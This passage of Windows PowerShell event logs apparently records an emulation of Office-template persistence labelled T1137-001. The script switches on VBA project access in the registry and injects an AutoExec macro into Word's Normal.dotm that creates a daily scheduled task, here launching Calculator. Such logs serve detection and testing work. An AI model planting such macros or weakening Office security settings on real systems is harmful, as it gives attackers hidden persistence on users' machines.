\"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\r\n# Define the path to the normal template\r\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\r\n# Create copy of orginal template for restoral\r\nCopy-Item -Path $docPath -Destination $copyPath -Force\r\n# VBA code to be insterted as a Macro\r\n# Will create a scheduled task to open the Calculator at 8:04pm daily\r\n$vbaCode = @\"\r\n  Sub AutoExec()\r\n  Dim applicationPath As String\r\n  Dim taskName As String\r\n  Dim runTime As String\r\n  Dim schTasksCmd As String\r\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\r\n  taskName = \"OpenCalcTask\"\r\n  runTime = \"20:04\"\r\n  schTasksCmd = \"schtasks /create /tn \"\"\" &amp; taskName &amp; \"\"\" /tr \"\"\" &amp; applicationPath &amp; \"\"\" /sc daily /st \" &amp; runTime &amp; \" /f\"\r\n  Shell \"cmd.exe /c \" &amp; schTasksCmd, vbNormalFocus\r\n  End Sub\r\n\"@\r\n# Create a new instance of Word.Application\r\n$word = New-Object -ComObject Word.Application\r\n# Keep the Word application hidden\r\n$word.Visible = $false\r\n# Open the document\r\n$document = $word.Documents.Open($docPath)\r\n# Access the VBA project of the document\r\n$vbaProject = $document.VBProject\r\n# Add a new module to the VBA project\r\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\r\n# Add the VBA code to the new module\r\n$newModule.CodeModule.AddFromString($vbaCode)\r\n# Run the Macro\r\n$word.run(\"AutoExec\")\r\n# Save and close the document\r\n$document.SaveAs($docPath)\r\n$document.Close()\r\n# Quit Word\r\n$word.Quit()\r\n# Release COM objects\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=5282bc43-9ba4-409d-9c3a-17b5f06bbb68\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"800"},"Version":"0","Level":"4","Task":"8","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:02:06.2659679"},"EventRecordID":"1074","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Add-Type -AssemblyName Microsoft.Office.Interop.Word\r\n, \tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=17\r\n\r\n\tUserId=SERVER002\\admin_test\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=86abead8-2bbc-4596-bc7e-a89c1feaab1b\r\n\tHostApplication=powershell.exe &amp; {# Registry setting to \"Trust access to the VBA project object model\" in Word\r\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\r\n$registryValue = \"AccessVBOM\"\r\n$registryData = \"1\"\r\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\r\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\r\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\r\n# Get the value of the Key/Value pair\r\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\r\n# Logical operation to: if the value of the key/value is 1, do nothing - \r\n# if the value is 0, change it to 1 and create flag1 - \r\n# if it doesn't exist, create the value and flag2\r\nif ($value -eq \"1\") \r\n{\r\n Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\r\n} \r\n elseif ($value -eq \"0\") \r\n{\r\n Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag1\" &gt; $flagPath1\r\n} \r\n else \r\n{\r\n Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag2\" &gt; $flagPath2\r\n}\r\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\r\n# Define the path of copied normal template for restoral\r\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\r\n# Define the path to the normal template\r\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\r\n# Create copy of orginal template for restoral\r\nCopy-Item -Path $docPath -Destination $copyPath -Force\r\n# VBA code to be insterted as a Macro\r\n# Will create a scheduled task to open the Calculator at 8:04pm daily\r\n$vbaCode = @\"\r\n  Sub AutoExec()\r\n  Dim applicationPath As String\r\n  Dim taskName As String\r\n  Dim runTime As String\r\n  Dim schTasksCmd As String\r\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\r\n  taskName = \"OpenCalcTask\"\r\n  runTime = \"20:04\"\r\n  schTasksCmd = \"schtasks /create /tn \"\"\" &amp; taskName &amp; \"\"\" /tr \"\"\" &amp; applicationPath &amp; \"\"\" /sc daily /st \" &amp; runTime &amp; \" /f\"\r\n  Shell \"cmd.exe /c \" &amp; schTasksCmd, vbNormalFocus\r\n  End Sub\r\n\"@\r\n# Create a new instance of Word.Application\r\n$word = New-Object -ComObject Word.Application\r\n# Keep the Word application hidden\r\n$word.Visible = $false\r\n# Open the document\r\n$document = $word.Documents.Open($docPath)\r\n# Access the VBA project of the document\r\n$vbaProject = $document.VBProject\r\n# Add a new module to the VBA project\r\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\r\n# Add the VBA code to the new module\r\n$newModule.CodeModule.AddFromString($vbaCode)\r\n# Run the Macro\r\n$word.run(\"AutoExec\")\r\n# Save and close the document\r\n$document.SaveAs($docPath)\r\n$document.Close()\r\n# Quit Word\r\n$word.Quit()\r\n# Release COM objects\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=5282bc43-9ba4-409d-9c3a-17b5f06bbb68\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=Add-Type -AssemblyName Microsoft.Office.Interop.Word\r\n, CommandInvocation(Add-Type): \"Add-Type\"\r\nParameterBinding(Add-Type): name=\"AssemblyName\"; value=\"Microsoft.Office.Interop.Word\"\r\nTerminatingError(Add-Type): \"Could not load file or assembly 'Microsoft.Office.Interop.Word, Version=12.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c' or one of its dependencies. The system cannot find the file specified.\"\r\n","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:02:06.4454179"},"EventRecordID":"1075","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=20\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=86abead8-2bbc-4596-bc7e-a89c1feaab1b\r\n\tHostApplication=powershell.exe &amp; {# Registry setting to \"Trust access to the VBA project object model\" in Word\r\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\r\n$registryValue = \"AccessVBOM\"\r\n$registryData = \"1\"\r\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\r\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\r\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\r\n# Get the value of the Key/Value pair\r\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\r\n# Logical operation to: if the value of the key/value is 1, do nothing - \r\n# if the value is 0, change it to 1 and create flag1 - \r\n# if it doesn't exist, create the value and flag2\r\nif ($value -eq \"1\") \r\n{\r\n Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\r\n} \r\n elseif ($value -eq \"0\") \r\n{\r\n Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag1\" &gt; $flagPath1\r\n} \r\n else \r\n{\r\n Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag2\" &gt; $flagPath2\r\n}\r\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\r\n# Define the path of copied normal template for restoral\r\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\r\n# Define the path to the normal template\r\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\r\n# Create copy of orginal template for restoral\r\nCopy-Item -Path $docPath -Destination $copyPath -Force\r\n# VBA code to be insterted as a Macro\r\n# Will create a scheduled task to open the Calculator at 8:04pm daily\r\n$vbaCode = @\"\r\n  Sub AutoExec()\r\n  Dim applicationPath As String\r\n  Dim taskName As String\r\n  Dim runTime As String\r\n  Dim schTasksCmd As String\r\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\r\n  taskName = \"OpenCalcTask\"\r\n  runTime = \"20:04\"\r\n  schTasksCmd = \"schtasks /create /tn \"\"\" &amp; taskName &amp; \"\"\" /tr \"\"\" &amp; applicationPath &amp; \"\"\" /sc daily /st \" &amp; runTime &amp; \" /f\"\r\n  Shell \"cmd.exe /c \" &amp; schTasksCmd, vbNormalFocus\r\n  End Sub\r\n\"@\r\n# Create a new instance of Word.Application\r\n$word = New-Object -ComObject Word.Application\r\n# Keep the Word application hidden\r\n$word.Visible = $false\r\n# Open the document\r\n$document = $word.Documents.Open($docPath)\r\n# Access the VBA project of the document\r\n$vbaProject = $document.VBProject\r\n# Add a new module to the VBA project\r\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\r\n# Add the VBA code to the new module\r\n$newModule.CodeModule.AddFromString($vbaCode)\r\n# Run the Macro\r\n$word.run(\"AutoExec\")\r\n# Save and close the document\r\n$document.SaveAs($docPath)\r\n$document.Close()\r\n# Quit Word\r\n$word.Quit()\r\n# Release COM objects\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=5282bc43-9ba4-409d-9c3a-17b5f06bbb68\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
